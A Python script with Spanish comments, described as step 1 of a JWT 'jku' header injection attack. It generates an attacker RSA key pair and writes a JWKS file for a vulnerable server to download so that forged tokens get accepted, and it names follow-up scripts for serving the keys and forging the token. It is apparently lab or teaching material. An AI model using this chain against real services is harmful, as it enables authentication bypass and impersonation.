"""
Paso 1 del ataque: el atacante genera SU propio par de claves RSA.

- Guarda la clave privada en  atacante_private.pem  (para firmar el token).
- Genera  jwks.json  con la clave PUBLICA en formato JWKS (lo que el
  servidor vulnerable se va a bajar via `jku`).
"""
import json
import os

import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

AQUI = os.path.dirname(os.path.abspath(__file__))

clave = rsa.generate_private_key(public_exponent=65537, key_size=2048)

# Clave privada del atacante (PEM) -> para firmar el token forjado.
priv_pem = clave.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
)
ruta_priv = os.path.join(AQUI, "atacante_private.pem")
with open(ruta_priv, "wb") as f:
    f.write(priv_pem)

# Clave publica -> en formato JWK, dentro de un JWKS {"keys": [ ... ]}.
jwk = json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(clave.public_key()))
jwk["kid"] = "atacante-key-1"
jwk["use"] = "sig"
jwk["alg"] = "RS256"
jwks = {"keys": [jwk]}

ruta_jwks = os.path.join(AQUI, "jwks.json")
with open(ruta_jwks, "w") as f:
    json.dump(jwks, f, indent=2)

print("[+] Clave privada del atacante:", ruta_priv)
print("[+] JWKS publico generado:     ", ruta_jwks)
print("[+] Listo. Ahora levanta servidor_jwks.py y corre forjar_token.py")
